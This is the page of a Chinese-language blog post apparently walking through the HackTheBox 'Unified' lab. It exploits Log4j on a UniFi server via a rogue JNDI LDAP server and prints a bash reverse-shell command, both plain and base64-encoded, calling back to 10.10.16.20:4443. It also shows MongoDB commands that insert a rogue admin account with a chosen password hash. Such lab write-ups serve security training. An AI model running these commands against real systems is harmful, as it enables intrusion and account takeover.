@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="hackthebox_unified解题思路前提条件宿主机和目标机器需要在同一网段中  kali中可以使用 1openvpn unified.ovpn 连接到hackthebox的vpn  windows 中可以使用openvpn.exe 下载连接 OPENVPN  OPENVPN 加代理 速度快一点    在创建配置文件时 需要勾选代理     题解task 7 What port do we">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hackthebox_unified解题">
+<meta property="og:url" content="https://imli.ink/2024/11/13/2024-07-28-hackthebox-unified/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="hackthebox_unified解题思路前提条件宿主机和目标机器需要在同一网段中  kali中可以使用 1openvpn unified.ovpn 连接到hackthebox的vpn  windows 中可以使用openvpn.exe 下载连接 OPENVPN  OPENVPN 加代理 速度快一点    在创建配置文件时 需要勾选代理     题解task 7 What port do we">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://imli.ink/assets/img/image-10.png">
+<meta property="og:image" content="https://imli.ink/assets/img/image-11.png">
+<meta property="og:image" content="https://imli.ink/assets/img/image-12.png">
+<meta property="og:image" content="https://imli.ink/assets/img/image-13.png">
+<meta property="og:image" content="https://imli.ink/assets/img/image-14.png">
+<meta property="og:image" content="https://imli.ink/assets/img/image-16.png">
+<meta property="og:image" content="https://imli.ink/assets/img/image-15.png">
+<meta property="og:image" content="https://imli.ink/assets/img/image-17.png">
+<meta property="og:image" content="https://imli.ink/assets/img/image-18.png">
+<meta property="og:image" content="https://imli.ink/assets/img/image-19.png">
+<meta property="og:image" content="https://imli.ink/assets/img/image-20.png">
+<meta property="og:image" content="https://imli.ink/assets/img/image-23.png">
+<meta property="og:image" content="https://imli.ink/assets/img/image-21.png">
+<meta property="og:image" content="https://imli.ink/assets/img/image-24.png">
+<meta property="og:image" content="https://imli.ink/assets/img/image-25.png">
+<meta property="og:image" content="https://imli.ink/assets/img/image-26.png">
+<meta property="og:image" content="https://imli.ink/assets/img/image-27.png">
+<meta property="og:image" content="https://imli.ink/assets/img/image-28.png">
+<meta property="og:image" content="https://imli.ink/assets/img/image-29.png">
+<meta property="og:image" content="https://imli.ink/assets/img/image-31.png">
+<meta property="og:image" content="https://imli.ink/assets/img/image-30.png">
+<meta property="og:image" content="https://imli.ink/assets/img/image-33.png">
+<meta property="og:image" content="https://imli.ink/assets/img/image-32.png">
+<meta property="og:image" content="https://imli.ink/assets/img/image-34.png">
+<meta property="og:image" content="https://imli.ink/assets/img/image-35.png">
+<meta property="article:published_time" content="2024-11-13T11:03:44.759Z">
+<meta property="article:modified_time" content="2024-07-28T05:48:55.308Z">
+<meta property="article:author" content="Leon">
+<meta property="article:tag" content="Sec">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://imli.ink/assets/img/image-10.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>hackthebox_unified解题</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-86660611-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-86660611-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/leonooo13">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2024/11/13/2024-07-29-bussiness_logic_bug/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/11/13/2024-07-28-weixin-passage/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://imli.ink/2024/11/13/2024-07-28-hackthebox-unified/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://imli.ink/2024/11/13/2024-07-28-hackthebox-unified/&text=hackthebox_unified解题"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://imli.ink/2024/11/13/2024-07-28-hackthebox-unified/&title=hackthebox_unified解题"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://imli.ink/2024/11/13/2024-07-28-hackthebox-unified/&is_video=false&description=hackthebox_unified解题"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=hackthebox_unified解题&body=Check out this article: https://imli.ink/2024/11/13/2024-07-28-hackthebox-unified/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://imli.ink/2024/11/13/2024-07-28-hackthebox-unified/&title=hackthebox_unified解题"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://imli.ink/2024/11/13/2024-07-28-hackthebox-unified/&title=hackthebox_unified解题"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://imli.ink/2024/11/13/2024-07-28-hackthebox-unified/&title=hackthebox_unified解题"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://imli.ink/2024/11/13/2024-07-28-hackthebox-unified/&title=hackthebox_unified解题"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://imli.ink/2024/11/13/2024-07-28-hackthebox-unified/&name=hackthebox_unified解题&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://imli.ink/2024/11/13/2024-07-28-hackthebox-unified/&t=hackthebox_unified解题"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#hackthebox-unified%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">1.</span> <span class="toc-text">hackthebox_unified解题思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.</span> <span class="toc-text">前提条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-number">3.</span> <span class="toc-text">题解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#task-7-What-port-do-we-need-to-inspect-intercepted-traffic-for"><span class="toc-number">3.1.</span> <span class="toc-text">task 7 What port do we need to inspect intercepted traffic for?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#task-8-What-port-is-the-MongoDB-service-running-on"><span class="toc-number">3.2.</span> <span class="toc-text">task 8 What port is the MongoDB service running on?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TASK-9-What-is-the-default-database-name-for-UniFi-applications"><span class="toc-number">3.3.</span> <span class="toc-text">TASK 9 What is the default database name for UniFi applications?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TASK-10"><span class="toc-number">3.4.</span> <span class="toc-text">TASK 10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TASK-11"><span class="toc-number">3.5.</span> <span class="toc-text">TASK 11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TASK-12"><span class="toc-number">3.6.</span> <span class="toc-text">TASK 12</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        hackthebox_unified解题
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Leon</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-13T11:03:44.759Z" class="dt-published" itemprop="datePublished">2024-11-13</time>
+        
+        (Updated: <time datetime="2024-07-28T05:48:55.308Z" class="dt-updated" itemprop="dateModified">2024-07-28</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Hackthebox/">Hackthebox</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Hackthebox/" rel="tag">Hackthebox</a>, <a class="p-category" href="/tags/Sec/" rel="tag">Sec</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="hackthebox-unified解题思路"><a href="#hackthebox-unified解题思路" class="headerlink" title="hackthebox_unified解题思路"></a>hackthebox_unified解题思路</h2><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><p>宿主机和目标机器需要在同一网段中</p>
+<ol>
+<li><p>kali中可以使用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openvpn unified.ovpn</span><br></pre></td></tr></table></figure>
+<p>连接到hackthebox的vpn</p>
+</li>
+<li><p>windows 中可以使用<code>openvpn.exe</code><br> 下载连接 <a target="_blank" rel="noopener" href="https://openvpn.net/client/client-connect-vpn-for-windows/">OPENVPN</a></p>
+<p> OPENVPN 加代理 速度快一点</p>
+<p> <img src="/../assets/img/image-10.png" alt="alt text"></p>
+<p> 在创建配置文件时 需要勾选代理</p>
+<p> <img src="/../assets/img/image-11.png" alt="alt text"></p>
+</li>
+</ol>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="task-7-What-port-do-we-need-to-inspect-intercepted-traffic-for"><a href="#task-7-What-port-do-we-need-to-inspect-intercepted-traffic-for" class="headerlink" title="task 7 What port do we need to inspect intercepted traffic for?"></a>task 7 What port do we need to inspect intercepted traffic for?</h3><p><img src="/../assets/img/image-12.png" alt="alt text"></p>
+<p>常规思路代理抓包</p>
+<p>remberme log4j??</p>
+<p>本机IP </p>
+<p><img src="/../assets/img/image-13.png" alt="alt text"></p>
+<p>尝试让本机IP访问目标机器的ldap服务</p>
+<p>request<br><img src="/../assets/img/image-14.png" alt="alt text"></p>
+<p>因为在windows 下进行攻击靶机此处使用 <code>windump</code>代替<code>tcpdump</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windump -D</span><br><span class="line">windump -i 1</span><br></pre></td></tr></table></figure>
+<p>指定端口<br><img src="/../assets/img/image-16.png" alt="alt text"></p>
+<p><img src="/../assets/img/image-15.png" alt="alt text"></p>
+<p>存在log4j漏洞<br><img src="/../assets/img/image-17.png" alt="alt text"></p>
+<p>通过编译ldap服务来利用该漏洞</p>
+<p><code>git clone https://github.com/veracode-research/rogue-jndi</code></p>
+<p>下载mvn.zip</p>
+<p><img src="/../assets/img/image-18.png" alt="alt text"></p>
+<p>理论上来说</p>
+<p><code>bash -i &gt;&amp;/dev/tcp/10.10.16.20/4443 0&gt;&amp;1</code></p>
+<p><code>bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE2LjIwLzQ0NDMgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p>
+<p><a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec">https://ares-x.com/tools/runtime-exec</a></p>
+<p><img src="/../assets/img/image-19.png" alt="alt text"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar target/RogueJndi-1.1.jar --<span class="built_in">command</span> <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE2LjIwLzQ0NDMgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> --hostname <span class="string">&quot;10.10.16.20&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>启动jar</p>
+<p><img src="/../assets/img/image-20.png" alt="alt text"></p>
+<p>注意看启动了tomcat服务<br><img src="/../assets/img/image-23.png" alt="alt text"></p>
+<p>监听4443端口</p>
+<p><img src="/../assets/img/image-21.png" alt="alt text"></p>
+<p>buripsuie 重发</p>
+<p><img src="/../assets/img/image-24.png" alt="alt text"></p>
+<p><strong>理论上会拿到shell</strong></p>
+<p><img src="/../assets/img/image-25.png" alt="alt text"></p>
+<p><img src="/../assets/img/image-26.png" alt="alt text"></p>
+<h3 id="task-8-What-port-is-the-MongoDB-service-running-on"><a href="#task-8-What-port-is-the-MongoDB-service-running-on" class="headerlink" title="task 8 What port is the MongoDB service running on?"></a>task 8 What port is the MongoDB service running on?</h3><p><img src="/../assets/img/image-27.png" alt="alt text"></p>
+<p>端口 27117</p>
+<h3 id="TASK-9-What-is-the-default-database-name-for-UniFi-applications"><a href="#TASK-9-What-is-the-default-database-name-for-UniFi-applications" class="headerlink" title="TASK 9 What is the default database name for UniFi applications?"></a>TASK 9 What is the default database name for UniFi applications?</h3><p>ace </p>
+<p>google it</p>
+<h3 id="TASK-10"><a href="#TASK-10" class="headerlink" title="TASK 10"></a>TASK 10</h3><p>What is the function we use to enumerate users within the database in MongoDB?</p>
+<p><code>mongo --port  27117 ace</code></p>
+<p><img src="/../assets/img/image-28.png" alt="alt text"></p>
+<p><code>db.admin.find()</code></p>
+<p><img src="/../assets/img/image-29.png" alt="alt text"></p>
+<h3 id="TASK-11"><a href="#TASK-11" class="headerlink" title="TASK 11"></a>TASK 11</h3><p>What is the function we use to update users within the database in MongoDB?</p>
+<p><code>db.admin.insert()</code></p>
+<h3 id="TASK-12"><a href="#TASK-12" class="headerlink" title="TASK 12"></a>TASK 12</h3><p>What is the password for the root user?</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.admin.insert(&#123; <span class="string">&quot;email&quot;</span> : <span class="string">&quot;pilgrim@localhost.local&quot;</span>, <span class="string">&quot;last_site_name&quot;</span> : <span class="string">&quot;default&quot;</span>, <span class="string">&quot;name&quot;</span> : <span class="string">&quot;unifi-admin&quot;</span>, <span class="string">&quot;time_created&quot;</span> : NumberLong(100019800), <span class="string">&quot;x_shadow&quot;</span> : <span class="string">&quot;$6<span class="variable">$s35</span>.XAjj83yh2Ssr<span class="variable">$NnS1Br9C1qhLxPSlxCJn9DH0q42DOqPJDx6fXTuA8fbfcTBfwRIT7eBRsyaCU13zlqwrtgNZGV7p4mpQ8yMOc</span>/&quot;</span> &#125;)</span><br></pre></td></tr></table></figure>
+<p><img src="/../assets/img/image-31.png" alt="alt text"></p>
+<p><img src="/../assets/img/image-30.png" alt="alt text"></p>
+<p><code>db.site.find().forEach(printjson);</code></p>
+<p><code>db.privilege.insert(&#123; &quot;admin_id&quot; : &quot;66a5d4f9e88a7f30f38ba2e8&quot;, &quot;permissions&quot; : [ ], &quot;role&quot; : &quot;admin&quot;, &quot;site_id&quot; : &quot;61ce269d46e0fb0012d47ec4&quot; &#125;);</code></p>
+<p>Submit user flag</p>
+<p><img src="/../assets/img/image-33.png" alt="alt text"></p>
+<p><img src="/../assets/img/image-32.png" alt="alt text"></p>
+<p>Submit root flag</p>
+<p><img src="/../assets/img/image-34.png" alt="alt text"></p>
+<p><img src="/../assets/img/image-35.png" alt="alt text"></p>
+<blockquote>
+<p>不知道为什么,OPENVPN 的UDP协议无法连接,只能使用TCP协议连接,速度慢一点,但是可以连接成功,不知道是不是因为网络问题,还是OPENVPN的问题, 有没有师傅知道的,请告诉我一下,谢谢! </p>
+</blockquote>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/leonooo13">项目</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#hackthebox-unified%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">1.</span> <span class="toc-text">hackthebox_unified解题思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.</span> <span class="toc-text">前提条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-number">3.</span> <span class="toc-text">题解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#task-7-What-port-do-we-need-to-inspect-intercepted-traffic-for"><span class="toc-number">3.1.</span> <span class="toc-text">task 7 What port do we need to inspect intercepted traffic for?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#task-8-What-port-is-the-MongoDB-service-running-on"><span class="toc-number">3.2.</span> <span class="toc-text">task 8 What port is the MongoDB service running on?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TASK-9-What-is-the-default-database-name-for-UniFi-applications"><span class="toc-number">3.3.</span> <span class="toc-text">TASK 9 What is the default database name for UniFi applications?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TASK-10"><span class="toc-number">3.4.</span> <span class="toc-text">TASK 10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TASK-11"><span class="toc-number">3.5.</span> <span class="toc-text">TASK 11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TASK-12"><span class="toc-number">3.6.</span> <span class="toc-text">TASK 12</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://imli.ink/2024/11/13/2024-07-28-hackthebox-unified/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://imli.ink/2024/11/13/2024-07-28-hackthebox-unified/&text=hackthebox_unified解题"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://imli.ink/2024/11/13/2024-07-28-hackthebox-unified/&title=hackthebox_unified解题"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://imli.ink/2024/11/13/2024-07-28-hackthebox-unified/&is_video=false&description=hackthebox_unified解题"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=hackthebox_unified解题&body=Check out this article: https://imli.ink/2024/11/13/2024-07-28-hackthebox-unified/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://imli.ink/2024/11/13/2024-07-28-hackthebox-unified/&title=hackthebox_unified解题"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://imli.ink/2024/11/13/2024-07-28-hackthebox-unified/&title=hackthebox_unified解题"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://imli.ink/2024/11/13/2024-07-28-hackthebox-unified/&title=hackthebox_unified解题"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://imli.ink/2024/11/13/2024-07-28-hackthebox-unified/&title=hackthebox_unified解题"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://imli.ink/2024/11/13/2024-07-28-hackthebox-unified/&name=hackthebox_unified解题&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://imli.ink/2024/11/13/2024-07-28-hackthebox-unified/&t=hackthebox_unified解题"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    Leon
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/leonooo13">项目</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'leonooo13/Talk';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
